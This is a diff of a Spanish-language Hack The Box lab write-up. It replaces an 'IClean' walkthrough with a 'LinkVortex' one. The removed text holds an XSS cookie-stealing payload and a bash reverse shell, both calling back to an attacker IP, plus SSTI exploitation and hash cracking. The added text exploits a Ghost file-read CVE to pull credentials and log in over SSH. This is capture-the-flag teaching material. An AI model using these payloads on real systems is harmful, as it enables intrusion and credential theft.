@@ -454,312 +454,131 @@ Realicé un ataque con **Intruder** de **BurpSuite**, logré identificar la cont
 ![](/assets/images/htb-writeup-LinkVortex/dash.png)
 
 
+# CVE-2023-40028
 
+De acuerdo con la versión del CMS **Ghost 5.58**, esta se encuentra afectada por una vulnerabilidad que permite la lectura de archivos arbitrarios en el servidor, de forma similar a un **LFI**. El único requisito es contar con credenciales válidas en el portal de administración, por lo que fue posible aprovecharla sin inconvenientes.
 
-Al revisar el sitio web de la máquina, obtuve el siguiente error. Para solucionarlo, añadí el dominio `capiclean.htb` a mi archivo `/etc/hosts`, lo que me permitió visualizar la página correctamente.
-
-![](/assets/images/htb-writeup-IClean/host.png)
-
-```bash
-┌──(root㉿kali)-[/home/kali]
-└─# cat /etc/hosts
-127.0.0.1       localhost
-127.0.1.1       kali
-::1             localhost ip6-localhost ip6-loopback
-ff02::1         ip6-allnodes
-ff02::2         ip6-allrouters
-10.10.11.12     capiclean.htb
-```
-![](/assets/images/htb-writeup-IClean/web1.png)
-
-Para obtener más información acerca de las tecnologías empleadas en el sitio web utilicé la wappalyzer.
-
-![](/assets/images/htb-writeup-IClean/web2.png)
-
-Veo que están utilizando Flask, lo cual podría indicar una vulnerabilidad de SSTI (Server-Side Template Injection). Realizando un escaneo de directorios con Dirsearch, identifique los siguientes: 
+Siguiendo la PoC de [CVE-2023-40028](https://github.com/0xDTC/Ghost-5.58-Arbitrary-File-Read-CVE-2023-40028) pude obtener el **/etc/passwd**
 
 ```bash
 ┌──(root㉿kali)-[/opt]
-└─# dirsearch -u 'http://capiclean.htb/'               
-/usr/lib/python3/dist-packages/dirsearch/dirsearch.py:23: DeprecationWarning: pkg_resources is deprecated as an API. See https://setuptools.pypa.io/en/latest/pkg_resources.html
-  from pkg_resources import DistributionNotFound, VersionConflict
-
-  _|. _ _  _  _  _ _|_    v0.4.3
- (_||| _) (/_(_|| (_| )
-
-Extensions: php, aspx, jsp, html, js | HTTP method: GET | Threads: 25 | Wordlist size: 11460
-
-Output File: /opt/reports/http_capiclean.htb/__24-07-01_13-55-29.txt
-
-Target: http://capiclean.htb/
-
-[13:55:29] Starting: 
-[13:55:47] 200 -    5KB - /about                                            
-[13:56:18] 302 -  189B  - /dashboard  ->  /                                 
-[13:56:39] 200 -    2KB - /login                                            
-[13:56:40] 302 -  189B  - /logout  ->  /                                    
-[13:57:02] 403 -  278B  - /server-status                                    
-[13:57:02] 403 -  278B  - /server-status/                                   
-[13:57:03] 200 -    8KB - /services                                         
-
-Task Completed    
+└─# ./CVE-2023-40028 -u admin@linkvortex.htb -p 'OctopiFociPilfer45' -h http://linkvortex.htb/                 
+WELCOME TO THE CVE-2023-40028 SHELL
+Enter the file path to read (or type 'exit' to quit): /etc/passwd       
+File content:
+root:x:0:0:root:/root:/bin/bash
+daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
+bin:x:2:2:bin:/bin:/usr/sbin/nologin
+sys:x:3:3:sys:/dev:/usr/sbin/nologin
+sync:x:4:65534:sync:/bin:/bin/sync
+games:x:5:60:games:/usr/games:/usr/sbin/nologin
+man:x:6:12:man:/var/cache/man:/usr/sbin/nologin
+lp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin
+mail:x:8:8:mail:/var/mail:/usr/sbin/nologin
+news:x:9:9:news:/var/spool/news:/usr/sbin/nologin
+uucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin
+proxy:x:13:13:proxy:/bin:/usr/sbin/nologin
+www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin
+backup:x:34:34:backup:/var/backups:/usr/sbin/nologin
+list:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologin
+irc:x:39:39:ircd:/run/ircd:/usr/sbin/nologin
+gnats:x:41:41:Gnats Bug-Reporting System (admin):/var/lib/gnats:/usr/sbin/nologin
+nobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin
+_apt:x:100:65534::/nonexistent:/usr/sbin/nologin
+node:x:1000:1000::/home/node:/bin/bash
+Enter the file path to read (or type 'exit' to quit): 
 ```
 
-Examinando manualmente el sitio web, identifiqué una página donde se puede enviar una solicitud de cotización. Parece que es la única funcionalidad del sitio, además del login.
-
-
-![](/assets/images/htb-writeup-IClean/web3.png)
-
-Intercepta la solicitud con Burp y después de realizar algunas pruebas me di cuenta que es vulnerable a Cross-Site Scripting Blind en el campo `service`.
-
-
-![](/assets/images/htb-writeup-IClean/burp.png)
+Dentro del proyecto encontré un archivo interesante: **Dockerfile.ghost**. Básicamente, este archivo define cómo construir una imagen de contenedor para el CMS **Ghost**.
 
 ```bash
-┌──(root㉿kali)-[/home/kali]
-└─# nc -lvnp 80   
-listening on [any] 80 ...
-connect to [10.10.16.100] from (UNKNOWN) [10.10.11.12] 58812
-GET / HTTP/1.1
-Host: 10.10.16.100
-Connection: keep-alive
-User-Agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/116.0.0.0 Safari/537.36
-Accept: */*
-Referer: http://127.0.0.1:3000/
-Accept-Encoding: gzip, deflate
-Accept-Language: en-US,en;q=0.9
+──(root㉿kali)-[/opt/git-dumper/linkvortex]
+└─# cat Dockerfile.ghost 
+FROM ghost:5.58.0
+
+# Copy the config
+COPY config.production.json /var/lib/ghost/config.production.json
+
+# Prevent installing packages
+RUN rm -rf /var/lib/apt/lists/* /etc/apt/sources.list* /usr/bin/apt-get /usr/bin/apt /usr/bin/dpkg /usr/sbin/dpkg /usr/bin/dpkg-deb /usr/sbin/dpkg-deb
+
+# Wait for the db to be ready first
+COPY wait-for-it.sh /var/lib/ghost/wait-for-it.sh
+COPY entry.sh /entry.sh
+RUN chmod +x /var/lib/ghost/wait-for-it.sh
+RUN chmod +x /entry.sh
+
+ENTRYPOINT ["/entry.sh"]
+CMD ["node", "current/index.js"]
 ```
 
-Para capturar la cookie, utilicé el siguiente payload codificado en URL:
-
-```html
-<img src=x onerror=document.location="http://10.10.16.100/xss-75.js?c="+document.cookie>
-```
-
-![](/assets/images/htb-writeup-IClean/burp2.png)
+Algo interesante que encontré fue que el archivo **Dockerfile.ghost** revela la ruta absoluta del archivo **config.production.json**, el cual corresponde al archivo de configuración principal de **Ghost**. Aprovechando esto, utilicé el script de la PoC para solicitar dicho archivo y visualizar su contenido.
 
 ```bash
-┌──(root㉿kali)-[/opt]
-└─# nc -lvnp 80              
-listening on [any] 80 ...
-connect to [10.10.16.100] from (UNKNOWN) [10.10.11.12] 33764
-GET /xss-75.js?c=session=eyJyb2xlIjoiMjEyMzJmMjk3YTU3YTVhNzQzODk0YTBlNGE4MDFmYzMifQ.ZoJ-cQ.ue-npu2ARF9jBsm2mP8niqHN4vo HTTP/1.1
-Host: 10.10.16.100
-Connection: keep-alive
-Upgrade-Insecure-Requests: 1
-User-Agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/116.0.0.0 Safari/537.36
-Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
-Referer: http://127.0.0.1:3000/
-Accept-Encoding: gzip, deflate
-Accept-Language: en-US,en;q=0.9
-```
-
-Ahora que tengo la cookie, abrí el inspector, la añadí  y accedí a la ruta dashboard identificada anteriormente, logrando ingresar al panel de administración del sitio web.
-
-
-![](/assets/images/htb-writeup-IClean/cook.png)
-
-
-![](/assets/images/htb-writeup-IClean/dashboard.png)
-
-Una vez dentro del panel de administración, revisé manualmente todas las funcionalidades, probando payloads de SSTI debido al uso de Flask. En la opción para generar un QR, identifiqué un parámetro vulnerable. 
-
-
-![](/assets/images/htb-writeup-IClean/stti.png)
-
-Después intenté enviar un payload para ejecutar comandos, pero recibí un error del servidor, lo que sugiere que algunos caracteres podrían estar bloqueados.
-
-
-![](/assets/images/htb-writeup-IClean/bburp.png)
-
-Para lograr la ejecución remota de comandos utilice el sig. payload en el cual se realizan algunos bypass de caracteres como `.` y `_`
-
-![](/assets/images/htb-writeup-IClean/payload.png)
-
-Referencia: [HackMD](https://hackmd.io/@Chivato/HyWsJ31dI)
-
-![](/assets/images/htb-writeup-IClean/burp3.png)
-
-Para poder generar una reverse shell cree un archivo con el sig. contenido:
-
-```bash
-#!/bin/bash
-
-bash -i >& /dev/tcp/10.10.16.100/443 0>&1
-```
-
-Posteriormente coloque un servidor temporal y llame mi archivo para que también se ejecutará y me regresara la shell
-
-
-![](/assets/images/htb-writeup-IClean/burp4.png)
-
-```bash
-┌──(root㉿kali)-[/tmp]
-└─# python3 -m http.server 80
-Serving HTTP on 0.0.0.0 port 80 (http://0.0.0.0:80/) ...
-10.10.11.12 - - [01/Jul/2024 17:25:54] "GET /r HTTP/1.1" 200 -
-```
-
-```bash
-┌──(root㉿kali)-[/home/kali]
-└─# nc -lvp 443
-listening on [any] 443 ...
-connect to [10.10.16.100] from capiclean.htb [10.10.11.12] 54024
-bash: cannot set terminal process group (1237): Inappropriate ioctl for device
-bash: no job control in this shell
-www-data@iclean:/opt/app$ whoami
-whoami
-www-data
-www-data@iclean:/opt/app$ 
-```
-
-Para trabajar mas cómodo realice un tratamiento de la TTY
-
-```bash
-┌──(root㉿kali)-[/home/kali]
-└─# nc -lvp 443
-listening on [any] 443 ...
-connect to [10.10.16.100] from capiclean.htb [10.10.11.12] 60878
-bash: cannot set terminal process group (1228): Inappropriate ioctl for device
-bash: no job control in this shell
-www-data@iclean:/opt/app$ python3 -c 'import pty;pty.spawn("/bin/bash")'
-python3 -c 'import pty;pty.spawn("/bin/bash")'
-www-data@iclean:/opt/app$ ^Z
-zsh: suspended  nc -lvp 443                                                                                                                         
-┌──(root㉿kali)-[/home/kali]
-└─# stty raw -echo; fg
-[1]  + continued  nc -lvp 443
-                                reset
-www-data@iclean:/opt/app$ export TERM=xterm
-www-data@iclean:/opt/app$ export SHELL=bash
-```
-
-Dentro del directorio donde obtuve la shell, hay un script en Python que contiene credenciales para iniciar sesión en MySQL
-
-```bash
-www-data@iclean:/opt/app$ cat app.py 
-from flask import Flask, render_template, request, jsonify, make_response, session, redirect, url_for
-from flask import render_template_string
-import pymysql
-import hashlib
-import os
-import random, string
-import pyqrcode
-from jinja2 import StrictUndefined
-from io import BytesIO
-import re, requests, base64
-
-app = Flask(__name__)
-
-app.config['SESSION_COOKIE_HTTPONLY'] = False
-
-secret_key = ''.join(random.choice(string.ascii_lowercase) for i in range(64))
-app.secret_key = secret_key
-# Database Configuration
-db_config = {
-    'host': '127.0.0.1',
-    'user': 'iclean',
-    'password': 'pxCsmnGLckUb',
-    'database': 'capiclean'
+Enter the file path to read (or type 'exit' to quit): /var/lib/ghost/config.production.json
+File content:
+{
+  "url": "http://localhost:2368",
+  "server": {
+    "port": 2368,
+    "host": "::"
+  },
+  "mail": {
+    "transport": "Direct"
+  },
+  "logging": {
+    "transports": ["stdout"]
+  },
+  "process": "systemd",
+  "paths": {
+    "contentPath": "/var/lib/ghost/content"
+  },
+  "spam": {
+    "user_login": {
+        "minWait": 1,
+        "maxWait": 604800000,
+        "freeRetries": 5000
+    }
+  },
+  "mail": {
+     "transport": "SMTP",
+     "options": {
+      "service": "Google",
+      "host": "linkvortex.htb",
+      "port": 587,
+      "auth": {
+        "user": "bob@linkvortex.htb",
+        "pass": "fibber-talented-worth"
+        }
+      }
+    }
 }
-
-app._static_folder = os.path.abspath("/opt/app/static/")
+Enter the file path to read (or type 'exit' to quit): 
 ```
 
-Probé estas credenciales con el usuario de la máquina (consuela), pero no funcionaron. Entonces, inicié sesión en MySQL y, al enumerar la base de datos, identifiqué el hash de la contraseña del usuario.
+Observé que el archivo contenía unas credenciales, así que decidí probarlas mediante **SSH**, y logré acceder a la máquina.
 
 ```bash
-www-data@iclean:/opt/app$ mysql -u iclean -p
-Enter password: 
-Welcome to the MySQL monitor.  Commands end with ; or \g.
-Your MySQL connection id is 200
-Server version: 8.0.36-0ubuntu0.22.04.1 (Ubuntu)
-
-Copyright (c) 2000, 2024, Oracle and/or its affiliates.
-
-Oracle is a registered trademark of Oracle Corporation and/or its
-affiliates. Other names may be trademarks of their respective
-owners.
-
-Type 'help;' or '\h' for help. Type '\c' to clear the current input statement.
-
-mysql> use capiclean;
-Reading table information for completion of table and column names
-You can turn off this feature to get a quicker startup with -A
-
-Database changed
-mysql> show tables;
-+---------------------+
-| Tables_in_capiclean |
-+---------------------+
-| quote_requests      |
-| services            |
-| users               |
-+---------------------+
-3 rows in set (0.00 sec)
-
-mysql> select * from users;
-+----+----------+------------------------------------------------------------------+----------------------------------+
-| id | username | password                                                         | role_id                          |
-+----+----------+------------------------------------------------------------------+----------------------------------+
-|  1 | admin    | 2ae316f10d49222f369139ce899e414e57ed9e339bb75457446f2ba8628a6e51 | 21232f297a57a5a743894a0e4a801fc3 |
-|  2 | consuela | 0a298fdd4d546844ae940357b631e40bf2a7847932f82c494daa1c9c5d6927aa | ee11cbb19052e40b07aac0ca060c23ee |
-+----+----------+------------------------------------------------------------------+----------------------------------+
-2 rows in set (0.00 sec)
-
-mysql> 
-```
-
-Identifiqué que el hash de la contraseña del usuario es SHA-256, así que pude romperlo con John y luego iniciar sesión mediante SSH.
-
-
-![](/assets/images/htb-writeup-IClean/hash.png)
-
-```bash
-┌──(root㉿kali)-[/home/kali]
-└─# john --format=Raw-SHA256 --wordlist=/usr/share/wordlists/rockyou.txt creds.txt
-Using default input encoding: UTF-8
-Loaded 1 password hash (Raw-SHA256 [SHA256 128/128 AVX 4x])
-Warning: poor OpenMP scalability for this hash type, consider --fork=4
-Will run 4 OpenMP threads
-Press 'q' or Ctrl-C to abort, almost any other key for status
-simple and clean (?)     
-1g 0:00:00:00 DONE (2024-07-01 18:51) 1.960g/s 7388Kp/s 7388Kc/s 7388KC/s sisqosgirl..sidneyMC03
-Use the "--show --format=Raw-SHA256" options to display all of the cracked passwords reliably
-Session completed. 
-```
-
-```bash
-┌──(root㉿kali)-[/home/kali]
-└─# ssh consuela@10.10.11.12
-consuela@10.10.11.12's password: 
-Welcome to Ubuntu 22.04.4 LTS (GNU/Linux 5.15.0-101-generic x86_64)
+┌──(root㉿kali)-[/opt]
+└─# ssh bob@10.10.11.47         
+bob@10.10.11.47's password: 
+Welcome to Ubuntu 22.04.5 LTS (GNU/Linux 6.5.0-27-generic x86_64)
 
  * Documentation:  https://help.ubuntu.com
  * Management:     https://landscape.canonical.com
  * Support:        https://ubuntu.com/pro
 
-  System information as of Mon Jul  1 10:52:13 PM UTC 2024
+This system has been minimized by removing packages and content that are
+not required on a system that users do not log into.
 
-
-
-
-Expanded Security Maintenance for Applications is not enabled.
-
-3 updates can be applied immediately.
-To see these additional updates run: apt list --upgradable
-
-Enable ESM Apps to receive additional future security updates.
-See https://ubuntu.com/esm or run: sudo pro status
-
-
-The list of available updates is more than a week old.
-To check for new updates run: sudo apt update
-
-You have mail.
-consuela@iclean:~$ whoami
-consuela
+To restore this content, you can run the 'unminimize' command.
+Last login: Tue Dec  3 11:41:50 2024 from 10.10.14.62
+bob@linkvortex:~$ whoami
+bob
+bob@linkvortex:~$
 ```
+
+
 
 ## Escalada de privilegios
 
